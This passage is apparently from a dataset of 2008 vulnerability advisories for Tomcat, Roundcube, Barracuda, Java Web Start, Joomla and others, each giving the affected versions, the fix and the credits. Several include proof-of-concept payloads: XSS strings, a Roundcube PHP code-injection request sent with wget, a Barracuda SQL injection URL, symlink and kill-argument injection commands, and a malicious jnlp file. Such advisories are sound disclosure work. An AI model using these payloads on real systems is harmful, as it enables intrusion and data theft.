- apply this patch http://svn.apache.org/viewvc?rev=750927&view=rev
- upgrade to 4.1.40 when released
Example:
http://localhost:8080/examples/jsp/cal/cal2.jsp?time=8am%20STYLE=xss:e/**/xpression(try{a=firstTime}catch(e){firstTime=1;alert('XSS')});
Credit:
This issue was discovered by Deniz Cevik.
References:
http://tomcat.apache.org/security.html
http://tomcat.apache.org/security-6.html
http://tomcat.apache.org/security-5.html
http://tomcat.apache.org/security-4.html
The Apache Tomcat Security Team
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFJsUexb7IeiTPGAkMRAnQkAKDSvIKgXQTCEOdYo0T1Ms0ze07qWQCgh2Af
7M0rD3B+d5vu90/ode27FLI=
=Y8kB
-----END PGP SIGNATURE-----"
18921,[SECURITY] CVE-2008-4308: Tomcat information disclosure vulnerability,,CVE-2008-4308,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-4308: Tomcat information disclosure vulnerability
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.32 to 4.1.34
Tomcat 5.5.10 to 5.5.20
Tomcat 6.0.x is not affected
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Note: Although this vulnerability affects relatively old versions of
Apache Tomcat, it was only discovered and reported to the Apache Tomcat
Security team in October 2008. Publication of this issue was then
postponed until now at the request of the reporter.
Description:
Bug 40771 (https://issues.apache.org/bugzilla/show_bug.cgi?id=40771) may
result in the disclosure of POSTed content from a previous request. For
a vulnerability to exist the content read from the input stream must be
disclosed, eg via writing it to the response and committing the
response, before the ArrayIndexOutOfBoundsException occurs which will
halt processing of the request.
Mitigation:
Upgrade to:
4.1.35 or later
5.5.21 or later
6.0.0 or later
Example:
See original bug report for example of how to create the error condition.
Credit:
This issue was discovered by Fujitsu and reported to the Tomcat Security
Team via JPCERT.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.7 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iD8DBQFJpdGRb7IeiTPGAkMRAkK+AKC1m5WunqOmwuFYSYEoASF/AokgDQCffmxM
U3IdbfYNVtRIzCW5XTvhv2E=
=rJGg
-----END PGP SIGNATURE-----"
19115,CVE-2008-4990 Enomaly ECP/Enomalism: Insecure temporary file creation vulnerabilities,,CVE-2008-4990,"CVE-2008-4990 Enomaly ECP/Enomalism: Insecure temporary file creation
vulnerabilities
1. Synopsis
All versions of Enomaly ECP/Enomalism prior to 2.1.1 use temporary
files in an insecure
manner, allowing for symlink and command injection attacks.
2. Impact Information
Background
Enomaly ECP (formerly Enomalism) is management software for virtual machines.
Description
Sam Johnston of Australian Online Solutions reported that enomalism2.sh uses
the /tmp/enomalism2.pid temporary file in an insecure manner.
Impact
A local attacker could perform a symlink attack to overwrite arbitrary files
on the system with root privileges, or inject arguments to the 'kill' command
to terminate or send arbitrary signals to any process(es) as root.
Exploits
a. ln -s /tmp/target /tmp/enomalism2.pid
b. echo ""-9 1"" > /tmp/enomalism2.pid
3. Resolution Information
Workaround
There is no known workaround at this time.
Resolution
All Enomaly ECP and Enomalism users should upgrade to the latest version.
History
2008-10-27 Bug initially reported to Enomaly by mail.
2008-10-27 Reuven Cohen acknowledged receipt and suggested a fix.
2008-11-06 CVE-2008-4990 allocated, update requested from Enomaly.
2008-11-08 Reuven Cohen publicly acknowledged the bug:
""Sam's security exploit is relativly minor and should not effect anyone with
decent dom0 access rules. We currently use random filenames that are pretty
hard to guess and if an un-authorized user were to gain access to the Dom0,
you'd probably have bigger issues to deal with. So this really only effects
""trusted"" dom0 users. The resolution is don't give out dom0 access to untrusted
users, which is probably a good idea anyway. The whole purpose of ECP is to
abstract resources so you don't have to give that level of access to core
system resources. The next release of Enomaly ECP will address this issue.""
2008-12-12 Enomaly ECP 2.1.1 (next subminor release) available with fix
2009-01-29 Enomaly ECP 2.2 (next minor release) available with fix"
19441,POC for CVE-2008-5619 (roundcubemail PHP arbitrary code injection),,CVE-2008-5619,"Public Release Date of POC: 2008-12-22
Author: Jacobo Avariento Gimeno (Sofistic)
CVE id: CVE-2008-5619
Bugtraq id: 32799
Severity: Critical
Vulnerability reported by: RealMurphy
Intro
----
Roundcube Webmail is a browser-based IMAP client that uses
""chuggnutt.com HTML to Plain Text Conversion"" library to convert
HTML text to plain text, this library uses the preg_replace PHP
function in an insecure manner.
Vulnerable versions:
Round Cube RoundCube Webmail 0.2-3 beta
Round Cube RoundCube Webmail 0.2-1 alpha (tested)
Analysis of the vulnerable code
----
The script bin/html2text.php creates an instance of the class html2text
with the given POST data, the problem arises in the file
program/lib/html2text.php in function _convert() on line 381:
// Run our defined search-and-replace
$text = preg_replace($this->search, $this->replace, $text);
Some patterns in $this->search allow interpret PHP code using the ""e""
flag, i.e.:
'/<a [^>]*href=(""|')([^""']+)1[^>]*>(.+?)</a>/ie', // <a href="""">
'/<b[^>]*>(.+?)</b>/ie', // <b>
'/<th[^>]*>(.+?)</th>/ie', // <th> and </th>
In concrete those would be replaced by:
'$this->_build_link_list(""\2"", ""\3"")', // <a href="""">
'strtoupper(""\1"")', // <b>
""strtoupper("" \1 "")"", // <th> and </th>
Now using PHP complex (curly) syntax we can take advantage of this to
interpret arbitrary PHP code, evaluating PHP code embedded inside
strings.
Proof of Concept
----
As this vulnerability was discovered in-the-wild:
http://trac.roundcube.net/ticket/1485618 was quite sure that would be
exploitable, using PHP curly we can execute phpinfo():
wget -q --header=""Content-Type: ''""
-O - --post-data='<b>{${phpinfo()}}</b>'
--no-check-certificate
http://127.0.0.1/roundcubemail-0.2-alpha/bin/html2text.php
Using PHP curly syntax plus some tricks to bypass PHP magic_quotes_gpc
to avoid using single or double quotes the arbitrary shell command
execution is fully feasible. As this vulnerability was discovered last
week no more details will be published yet, more info will be available
at http://sofistic.net.
--
Jacobo Avariento Gimeno
IT Security Department @ Sofistic
Your security, our concern!
http://sofistic.net"
19462,[SECURITY] CVE-2008-2938 - Apache Tomcat information disclosure vulnerability - Update 2,,CVE-2008-2938,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-2938: Apache Tomcat information disclosure vulnerability - Update 2
Severity: Important
Vendor:
Multiple (was The Apache Software Foundation)
Versions Affected:
Various
Description (new information):
This vulnerability was originally reported to the Apache Software Foundation as
a Tomcat vulnerability. Investigations quickly identified that the root cause
was an issue with the UTF-8 charset implementation within the JVM. The issue
existed in multiple JVMs including current versions from Sun, HP, IBM, Apple and
Apache.
It was decided to continue to report this as a Tomcat vulnerability until such
time as the JVM vendors had released fixed versions.
Unfortunately, the release of fixed JVMs and associated vulnerability disclosure
has not been co-ordinated. There has been some confusion within the user
community as to the nature and root cause of CVE-2008-2938. Therefore, the
Apache Tomcat Security Team is issuing this update to clarify the situation.
Mitigation:
Contact your JVM vendor for further information.
Tomcat users may upgrade as follows to a Tomcat version that contains a workaround:
6.0.x users should upgrade to 6.0.18
5.5.x users should upgrade to 5.5.27
4.1.x users should upgrade to 4.1.39
Credit:
This additional information was discovered by the Apache security
team.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.8 (Darwin)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAklKflkACgkQb7IeiTPGAkPEqwCg5WiCeyaGrUbP/PTIhqF8TGZt
DcsAoJIx+NnKCCAk2JxGftVZbxxPrWGl
=JALs
-----END PGP SIGNATURE-----"
19463,"Re: Joomla: Session hijacking vulnerability, CVE-2008-4122",,CVE-2008-4122,"Yes, I can reproduce this behavior. The application should reinitialize the cookie after the login but instead it will keep the previous cookie. An interesting thing this is valid only for the login_module, the administrator login page does not automatically redirect to HTTPS by configuration."
19480,"Joomla: Session hijacking vulnerability, CVE-2008-4122",,CVE-2008-4122,"Joomla: Session hijacking vulnerability, CVE-2008-4122
References
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4122
http://int21.de/cve/CVE-2008-4122-joomla.html
http://enablesecurity.com/2008/08/11/surf-jack-https-will-not-save-you/
https://www.defcon.org/html/defcon-16/dc-16-speakers.html#Perry
Description
When configuring a web application to use only ssl (e. g. by forwarding all
http-requests to https), a user would expect that sniffing and hijacking the
session is impossible.
Though, for this to be secure, one needs to set the session cookie to have the
secure flag. Else the cookie will be transferred through http if the victim's
browser does a single http-request on the same domain.
Joomla 1.5.8 does not set that flag. I've contacted the Joomla security team
in advance but got no reply.
Disclosure Timeline
2008-11-18: Vendor contacted
2008-12-16 Published advisory
Credits and copyright
This vulnerability was discovered by Hanno Boeck of schokokeks.org webhosting.
It's licensed under the creative commons attribution license.
Hanno Boeck, http://www.hboeck.de
--
Hanno Böck Blog: http://www.hboeck.de/
GPG: 3DBD3B20 Jabber/Mail: hanno hboeck de"
19481,CVE-2008-0971 - Barracuda Networks products Multiple Cross-Site Scripting Vulnerabilities,,CVE-2008-0971,"CVE Numbers: CVE-2008-0971
Vulnerabilities: Multiple Cross-Site Scripting (Persistent & Reflected)
Risk: Medium
Attack vector: From Remote
Vulnerabilities Discovered: 16th June 2008
Vendor Notified: 16th June 2008
Advisory Released: 15th December 2008
Abstract
Barracuda Networks Message Archiver product is vulnerable to persistent and reflected Cross-Site Scripting (XSS) attacks. Barracuda Spam Firewall, IM Firewall and Web Filter products are vulnerable to multiple reflected XSS attacks. When exploited by an authenticated user, the identified vulnerabilities can lead to Information Disclosure, Session Hijack,
access to Intranet available servers, etc.
Description
The index.cgi resource was identified as being susceptible to multiple persistent and reflected Cross Site Scripting (XSS)
attacks.
a. Persistent XSS in Barracuda Message Archiver
In Search Based Retention Policy, the Policy Name field allows persistent XSS when set to something like policy_name"" onblur=""alert('xss')
b. Reflected XSS in Barracuda Message Archiver
Setting various parameters in IP Configuration, Administration, Journal Accounts, Retention Policy, and GroupWise Sync allow
reflected XSS attacks.
c. Reflected XSS in Barracuda Spam Firewall, IM Firewall and Web Filter
� User provided input is not sanitised when displayed as part of error messages - identified in all verified products.
� User provided input is not sanitised when used to perform various searches - identified in Barracuda Web Filter.
� Manipulation of HTML INPUT hidden elements - identified in all verified products.
e.g auth_type INPUT hidden element allows a reflected XSS attack when set to something like
Local""><script>alert('xss')</script>
Original Advisory:
http://dcsl.ul.ie/advisories/03.htm
Barracuda Networks Technical Alert
http://www.barracudanetworks.com/ns/support/tech_alert.php
Affected Versions
Barracuda Message Archiver (Firmware v1.1.0.010, Model 350)
Barracuda Spam Firewall (Firmware v3.5.11.020, Model 600)
Barracuda Web Filter (Firmware v3.3.0.038, Model 910)
Barracuda IM Firewall (Firmware v3.0.01.008, Model 420)
Other models/firmware versions might be affected.
Mitigation
Vendor recommends upgrading to the following firmware version:
Barracuda Message Archiver Release 1.2.1.002 (2008-07-22)
Barracuda Spam Firewall Release 3.5.12.007 (2008-10-24)
Barracuda Web Filter Release 3.3.0.052 (2008-08-04)
Barracuda IM Firewall Release 3.1.01.017 (2008-07-02)
Barracuda Load Balancer Release 2.3.024 (2008-10-20)
Alternatively, please contact Barracuda Networks for technical support.
Credits
Dr. Marian Ventuneac, marian.ventuneac ul ie
Data Communication Security Laboratory, Department of Electronic & Computer Engineering, University of Limerick
Disclaimer
Data Communication Security Laboratory releases this information with the vendor acceptance. DCSL is not responsible for any malicious application of the information presented in this advisory."
19482,CVE-2008-1094 - Barracuda Span Firewall SQL Injection Vulnerability,,CVE-2008-1094,"CVE Number: CVE-2008-1094
Vulnerability: SQL Injection
Risk: Medium
Attack vector: From Remote
Vulnerability Discovered: 16th June 2008
Vendor Notified: 16th June 2008
Advisory Released: 15th December 2008
Abstract
Barracuda Networks Spam Firewall is vulnerable to various SQL Injection attacks. When exploited by an authenticated user, the identified vulnerability can lead to Denial of Service, Database Information Disclosure, etc.
Description
The index.cgi resource was identified as being susceptible to SQL Injection attacks.
When filtering user accounts in Users->Account View section, the pattern_x parameter (where x = 0..n) allows inserting arbitrary SQL code once filter_x parameter is set to search_count_equals� value.
/cgi-bin/index.cgi?&user=&password=&et=&auth_type=Local&locale=en_US&realm=&primary_tab=USERS&secondary_tab=
per_user_account_view&boolean_0=boolean_and&filter_0=search_count_equals&pattern_0=if(database() like concat(char(99),char(37)),5,0)
An attacker can exploit this vulnerability by injecting arbitrary SQL code to be executed as part of the SQL query.
Original Advisory:
http://dcsl.ul.ie/advisories/02.htm
Barracuda Networks Technical Alert
http://www.barracudanetworks.com/ns/support/tech_alert.php
Affected Versions
Barracuda Spam Firewall (Firmware v3.5.11.020, Model 600)
Other products/versions might be affected.
Mitigation
Vendor recommends to the following firmware version
Barracuda Spam Firewall (Firmware v3.5.12.001)
Alternatively, please contact Barracuda Networks for technical support.
Credits
Dr. Marian Ventuneac, marian.ventuneac ul ie
Data Communication Security Laboratory, Department of Electronic & Computer Engineering, University of Limerick
Disclaimer
Data Communication Security Laboratory releases this information with the vendor acceptance. DCSL is not responsible for any malicious application of the information presented in this advisory."
19579,CVE-2008-5079: multiple listen()s on same socket corrupts the vcc table,,CVE-2008-5079,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-5079: multiple listen()s on same socket corrupts the vcc table
Release Date: 2008/12/05
I. Impact
Local Denial of Service on Linux kernel 2.6.x
II. Description
A vulnerabilty exists in Linux Kernel which can be exploited
by malicious users to cause a Denial of Service.
It seems that calling the svc_listen function in 'net/atm/svc.c'
twice on same socket, will create unassigned PVC/SVC entries,
despite returning EUNATCH.
This entries are visible using proc filesystem.
#cat /proc/net/atm/vc
Address Itf ...
c7f34400 Unassigned ...
c7f34400 Unassigned ...
c7f34400 Unassigned ...
.......
The code in 'net/atm/proc.c', responsible for displaying this info,
can't handle the unassigned entries. Kernel will freeze with
infinite loop in 'proc.c' if we cat '/proc/net/atm/pvc' :
net/atm/proc.c:
074 static inline int compare_family(struct sock *sk, int family)
073 {
074 return !family || (sk->sk_family == family);
075 }
091 try_again:
092 for (; sk; sk = sk_next(sk)) {
093 l -= compare_family(sk, family); <<<<<<<<<
094 if (l < 0)
095 goto out;
096 }
IV. Patch
http://marc.info/?l=linux-netdev&m=122841256115780&w=2
V. Credit
Hugo Dias - hdias [at] synchlabs [dot] com
VI. History
2008/11/14 - Vulnerability Discovered
2008/11/28 - Reported to vendor
2008/12/05 - Vendor Released Patch
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.0.10-svn4870 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkk4jIoACgkQE8nuJSQgUf2IawCgm6bdEkoj5DCGJPIXOob60nSM
lTwAnRtJCDPW4d4FE7F6KpzKw46EqO7d
=9Qis
-----END PGP SIGNATURE-----"
19602,CVE-2008-2086: Java Web Start File Inclusion via System Properties Override,,CVE-2008-2086,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
Virtual Security Research, LLC.
http://www.vsecurity.com/
Security Advisory
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Advisory Name: Java Web Start File Inclusion via System Properties Override
Release Date: 2008-12-03
Application: Sun Java Runtime Environment / Java Web Start
Versions: See below
Severity: High
Author: Timothy D. Morgan <tmorgan {a} vsecurity.com>
Vendor Status: Patch Released [3]
CVE Candidate: CVE-2008-2086
Reference: http://www.vsecurity.com/bulletins/advisories/2008/JWS-props.txt
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Product Description
- -------------------
- From [1]:
""Using Java Web Start technology, standalone Java software applications
can be deployed with a single click over the network. Java Web Start
ensures the most current version of the application will be deployed,
as well as the correct version of the Java Runtime Environment (JRE).""
Vulnerability Overview
- ----------------------
On March 27th, VSR identified a vulnerability in Java Web Start related
to the execution of privileged applications. This flaw could allow an
attacker to execute arbitrary code on a victim system if a user could be
convinced to visit a malicious web site.
Product Background
- ------------------
Java Web Start (JWS) applications are launched through specially
formatted XML files hosted on web sites with a ""jnlp"" file extension.
These files reference one or more ""jar"" files which are meant to be
downloaded and executed by client systems. JWS applications are run in
unprivileged mode by default but may be run with full user privileges if
the jnlp file requests this access. Privileged JWS applications must
have each jar file signed by the same trusted author in order to be
executed. However, jnlp files are not signed and may be hosted by
third-party web sites.
In addition to specifying application components, the jnlp specification
permits application authors to supply certain System properties which
may be retrieved by the application through the System.getProperty() and
System.getProperties() methods. Besides any user-supplied properties,
the Java VM also provides access to a number of sensitive runtime
settings through this interface.
More information on the jnlp format may be found in [2].
Vulnerability Details
- ---------------------
VSR discovered an unsafe behavior in the way properties are interpreted
when specified in jnlp files. In certain versions of the Java Runtime
Engine (JRE), values supplied through jnlp files override existing
system defaults. Thus far, VSR has verified the following System
properties may be overridden:
java.home
java.ext.dirs
user.home
Of particular interest are the java.home and java.ext.dirs properties.
If an attacker could lure a victim to open a malicious jnlp file which
references a trusted application, it may be executed without any
confirmation by the user. However, as the application attempts to load
classes, it may trust the malicous java.home and/or java.ext.dirs value.
These paths could point to a malicious local or remote JRE or extensions
installation. It appears that under Windows, UNC network paths may be
used for the java.home value. It is not yet known whether or not UNC
paths may be used for java.ext.dirs.
During testing, VSR found that Java Cryptography Extension (JCE) classes
failed to load when java.home was set to an invalid path. However, by
setting this path to network share which hosted a valid JRE
installation, the JCE classes loaded correctly. If such a network share
were hosted by the attacker, then arbitrary code could potentially be
loaded without restrictions, unbeknownst to the victim.
The following XML shows what a malicious jnlp file might look like.
Note that the malicious jnlp file would likely be very similar to the
ones users normally rely on with certain properties overriden in the
resources section.
<jnlp spec=""1.0+"" codebase=""http://trusted.example.org/"" href=""evil.jnlp"">
<information>
<title>Trusted Application</title>
<vendor>Trusted Vendor</vendor>
<description>Trusted Application by Trusted Vendor</description>
<homepage href=""http://trusted.example.org/"" />
<offline-allowed />
</information>
<security><all-permissions /></security>
<resources>
<j2se version=""1.5+"" />
<!-- Next line overrides the JRE's java.home System property -->
<property name=""java.home"" value=""\evil.example.comjre"" />
<jar href=""signed-and-trusted-jce-dependent-library.jar"" />
</resources>
<application-desc main-class=""org.example.trusted.app.StartApp"" />
</jnlp>
To fully exploit this specific attack vector, an attacker would need to
remotely or locally host a malicious version of classes used by a
trusted application and then lure a user into opening a malicious jnlp
file. A firewall installed between the attacker and victim could
mitigate this issue if the victim's machine were restricted from
accessing the hosted network share.
Note that certain JWS applications may trust other System properties,
such as user.home, and use them in ways which could be exploited in
application-specific variants of this attack.
Versions Affected
- -----------------
During testing, VSR found the following JRE versions to be vulnerable:
* 1.5.0_15 on Windows
* 1.6.0 on Windows
* 1.5.0_13-b05-237 on Mac OS X (distributed by Apple)
Version 1.6.0_05 on Windows did not appear to be vulnerable. However,
Sun recommends that any installations with the following versions be
updated:
* JDK and JRE 6 Update 10 and earlier
* JDK and JRE 5.0 Update 16 and earlier
* SDK and JRE 1.4.2_18 and earlier
Sun reports that JRE 1.3.x is not affected, nor is JRE 6 Update 7 for
Intel Itanium. For more information on versions affected and updates,
see [3].
Vendor Response
- ---------------
The following timeline details Sun's response to the reported issue:
2008-03-28 Sun was provided a draft advisory.
2008-03-28 An initial response was received from Sun.
2008-04-11 Sun reported that the issue could not be reproduced.
2008-04-11 VSR provided Sun additional exploit details.
2008-04-29 Sun reported the issue was reproduced and assigned
an internal issue tracking number of CR 6694892.
2008-12-03 Sun Alert 244988 was released with an associated security
update.
Sun Alert 244988 may be obtained at:
http://sunsolve.sun.com/search/document.do?assetkey=1-66-244988-1
Recommendation
- --------------
Apply the JRE update as soon as possible. The issue is fixed in:
* JDK and JRE 6 Update 11 or later
* JDK and JRE 5.0 Update 17 or later
* SDK and JRE 1.4.2_19 or later
Review Sun Alert 244988 [3] for information on how to temporarily
disable Java Web Start to work around this issue.
Common Vulnerabilities and Exposures (CVE) Information
- ------------------------------------------------------
The Common Vulnerabilities and Exposures (CVE) project has assigned
the number CVE-2008-2086 to this issue. This is a candidates for
inclusion in the CVE list (http://cve.mitre.org), which standardizes
names for security problems.
Acknowledgements
- ----------------
Thanks to George Gal for assistance in testing. VSR would like to thank
Sun for cooperating in the patch development process.
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
References:
1. Java Web Start Technology
http://java.sun.com/products/javawebstart/
2. Java Web Start Architecture JNLP Specification & API Documentation
http://java.sun.com/products/javawebstart/download-spec.html
3. Sun Alert 244988
http://sunsolve.sun.com/search/document.do?assetkey=1-66-244988-1
- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Copyright 2008 Virtual Security Research, LLC. All rights reserved.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)
iD8DBQFJN1kCQ1RSUNR+T+gRAl6TAJ9LmdTw8S4K3RMpgseiw/AkHUc81ACeK+pn
cXqD3636+kFoMIUNlNhVZUw=
=yv7u
-----END PGP SIGNATURE-----"
19939,"Cross Site Scripting (XSS) Vulnerabilitiy in cpcommerce, CVE-2008-4121",,CVE-2008-4121,"Cross Site Scripting (XSS) Vulnerabilitiy in cpcommerce,
CVE-2008-4121
References
http://www.datensalat.eu/~fabian/cve/CVE-2008-4121-cpcommerce.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4121
http://cpcommerce.cpradio.org/
Description
cpCommerce is an open-source e-commerce solution that is maintained by
templates and modules.
Example
Assuming cpcommerce is installed on http://localhost/cpcommerce/,
anybody could inject JavaScript:
<form method=""post"" action=""http://localhost/cpcommerce/search.php"">
<input type=""hidden"" name=""action"" value=""search.quick"">
<input type=""text"" name=""search"" value='""><script>alert(1)</script>'>
<input type=submit></form>
<form method=""post"" action=""http://localhost/cpcommerce/sendtofriend.php""> <input
type=""hidden"" name=""action"" value=""sendtofriend"">
<input type=""text"" name=""name"" value='""><script>alert(1)</script>'>
<input type=submit></form>
Disclosure Timeline
2008-09-23 Vendor contacted
2008-09-23 Vendor released 1.2.4
2008-10-19 Published advisory
CVE Information
The Common Vulnerabilities and Exposures (CVE) project has assigned the
name CVE-2008-4121 to this issue. This is a candidate for inclusion in
the CVE list (http://cve.mitre.org/), which standardizes names for
security problems.
Credits and copyright
This vulnerability was discovered by Fabian Fingerle (published with
help from Hanno Boeck [0]). It's licensed under the creative commons
attribution license.
Fabian Fingerle, 2008-09-04, http://www.fabian-fingerle.de
[0] http://www.hboeck.de"
19940,CVE-2008-4000: Oracle PeopleTools � Authentication Weakness,,CVE-2008-4000,"PeopleSoft Enterprise applications architecture is built around the proprietary PeopleTools technology. PeopleTools user authentication mechanism requires a user to provide the correct credentials in order to gain access through the web interface. An account lockout policy disables a user account if an incorrect password is entered a specified number of times over a specified period.
Scope
Imperva�s Application Defense Center conducts extensive research on enterprise applications on behalf of its customers, including research on applications like PeopleSoft, SAP and Oracle EBS. During its research, the team has identified a security flaw related to PeopleTools authentication mechanism and account lock-out policy.
Findings
By observing the system�s response to repeated authentication attempts, an attacker can brute force valid user credentials even though the account lock-out mechanism is enabled. The attacker could use the compromised credentials once the account is unlocked by an administrator.
Details
Upon a false login attempt, the message �Your User ID and/or Password are invalid� is returned to the user. When the correct password is entered, and the account has been locked, the message �Your account has been disabled� is returned. Therefore an attacker can conduct a brute force attack even after the account has been locked.
Once the account is unlocked, PeopleTools does not enforce password changing. Therefore the compromised set of credentials can be used to break into the unlocked account.
Exploit
Brute force login to the application until the correct password is detected.
Vulnerability ID
CVE-2008-4000
Tested Versions
Vulnerable
PeopleTools 8.49 (8.4x)
Vendor's Status
Vendor notified on August 4, 2008. Patch released by vendor on October 14, 2008.
Workaround
Within PeopleSoft, select the �Enable password controls� checkbox and then define the number of days that a password is valid. The actual number of days does not matter for this purpose.
When an account is locked because of too many login attempts, the administrator can unlock the account and then manually set the status of the password for the account to �expired�. This will force the user to change the password during the next login.
An alternative workaround is to create a custom Web application policy in the SecureSphere Web Application Firewall. The policy match criteria would include the URL prefix of the PeopleSoft login page (the action URL for the authentication form) and the number of occurrences within a specified period of time.
Discovered by:
Yaniv Azaria of Imperva�s ADC
Disclaimer
The information within this advisory is subject to change without notice. Use of this information constitutes acceptance for use in an AS IS condition. Any use of this information is at the user�s own risk. There are no warranties, implied or expressed, with regard to this information. In no event shall the author be liable for any direct or indirect damages whatsoever arising out of or in connection with the use or spread of this information.
Copyright � 2007 Imperva, Inc.
Redistribution of this alert electronically is allowed as long as it is not edited in any way. To reprint this alert, in whole or in part, in any medium other than electronic medium, adc imperva com for permission. Sections
ADC Security Advisories"
19941,CVE-2008-2625: Oracle DBMS � Proxy Authentication Vulnerability,,CVE-2008-2625,"Oracle is a widely-deployed Database Management System (DBMS) that supports a variety of applications. Many multi-tier applications are designed to use proxy authentication, restricting a middle tier to establish the database connection on behalf of the users. The standard authentication mechanism requires the client, the middle tier in this case, to provide valid credentials in order to authenticate and connect to the DBMS. User sessions are then created through the proxy connection. Oracle TNS protocol messages are used for session setup, authentication and data transfer.
Scope
Imperva�s Application Defense Center (ADC) conducts extensive research on enterprise applications and databases. During its research, the team has identified a vulnerability in Oracle�s proxy authentication and access control mechanism.
Findings
While proxy authentication is enabled for a user account through a proxy account, it is possible to create a separate connection using the original user account without authenticating the connection.
Details
Oracle supports a proxy authentication mode which a user establishes a session through a proxy and the proxy establishes a session on the user�s behalf to the database. These sessions are created using the Oracle TNS protocol level messages and do not require additional authentication. This scenario is recommended by Oracle for multi-tier environments.
While the user sessions are open through the proxy connection, an attacker can create a new connection to the database impersonating the original user without supplying a password. The attacker executes the attack by opening a TNS connection to the database server and sending a manipulated authentication message with the login mode flags set to proxy login and the session ID and serial number of the original session opened through the proxy account.
Vulnerability ID
Proposed CVE Candidate (as of October 14, 2008): CVE-2008-2625
Tested Versions
Vulnerable
Oracle 8i (8.1.7.x.x)
Oracle 9i (9.2.0.7)
Oracle 10g Release 1 (10.1.0.4.2)
Oracle 10g Release 2 (10.2.0.1.0)
Vendor�s Status
Vendor notified on December 13, 2005. Patch released by vendor on October 14, 2008.
Workaround
Always require password authentication, even for proxy connections
Alternatively, disable proxy authentication mode and enforce this policy by configuring the SecureSphere Database Security Gateway to alert when users are granted proxy access
The SecureSphere Database Security Gateway can also enforce all proxy account connections to the database originate from the proxy server IP address
Discovered by:
Amichai Shulman - Imperva Co-Founder, CTO and Head of Imperva�s Application Defense Center (ADC).
Disclaimer
The information within this advisory is subject to change without notice. Use of this information constitutes acceptance for use in an AS IS condition. Any use of this information is at the user�s own risk. There are no warranties, implied or expressed, with regard to this information. In no event shall the author be liable for any direct or indirect damages whatsoever arising out of or in connection with the use or spread of this information.
Copyright � 2007 Imperva, Inc.
Redistribution of this alert electronically is allowed as long as it is not edited in any way. To reprint this alert, in whole or in part, in any medium other than electronic medium, adc imperva com for permission."
20001,[SECURITY] CVE-2008-3271 - Apache Tomcat information disclosure,,CVE-2008-3271,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
CVE-2008-3271: Tomcat information disclosure vulnerability
Severity: Low
Vendor:
The Apache Software Foundation
Versions Affected:
Tomcat 4.1.0 to 4.1.31
Tomcat 5.5.0
Tomcat 6.0.x is not affected
The unsupported Tomcat 3.x, 4.0.x and 5.0.x versions may be also affected
Description:
Bug 25835 (https://issues.apache.org/bugzilla/show_bug.cgi?id=25835) can,
in very rare circumstances, permit a user from a non-permitted IP address
to gain access to a context protected with a valve that extends
RemoteFilterValve.
Mitigation:
Upgrade to:
4.1.32 or later
5.5.1 or later
6.0.0 or later
Example:
This has only been reproduced using a debugger to force a particular
processing sequence across two threads.
1. Set a breakpoint right after the place where a value
is to be entered in the instance variable of regexp
(search:org.apache.regexp.CharacterIterator).
2. Send a request from the IP address* which is not permitted.
(stopped at the breakpoint)
*About the IP address which is not permitted.
The character strings length of the IP address which is set
in RemoteAddrValve must be same.
3. Send a request from the IP address which was set in
RemoteAddrValve.
(stopped at the breakpoint)
In this way, the instance variable is to be overwritten here.
4. Resume the thread which is processing the step 2 above.
5. The request from the not permitted IP address will succeed.
Credit:
This issue was discovered by Kenichi Tsukamoto (Development Dept. II,
Application Management Middleware Div., FUJITSU LIMITED) and reported to
the Tomcat security team via JPCERT.
References:
http://tomcat.apache.org/security.html
Mark Thomas
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
iEYEARECAAYFAkjuibsACgkQb7IeiTPGAkO33wCgiBY0nBdTaXBC8oPoHqMWH4mt
OtgAmQHjgnxg0vKKSp43vez8XaBIZpOj
=9Z/F
-----END PGP SIGNATURE-----"
20127,"Cross Site Scripting (XSS) Vulnerabilitiy in flatpress 0.804, CVE-2008-4120",,CVE-2008-4120,"Cross Site Scripting (XSS) Vulnerabilitiy in flatpress 0.804,
CVE-2008-4120
References
http://www.datensalat.eu/~fabian/cve/CVE-2008-4120-flatpress.html
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4120
http://www.flatpress.org/
Description
FlatPress is an open-source standard-compliant multi-lingual extensible
blogging engine which does not require a DataBase Management System to
work.
Example
Assuming flatpress is installed on http://localhost/flatpress/, anybody
could inject JavaScript:
<form method=""post"" action=""http://localhost/flatpress/login.php"">
<input type=""text"" name=""user"" value='""><script>alert(1)</script>'>
<input type=submit></form>
<form method=""post"" action=""http://localhost/flatpress/login.php"">
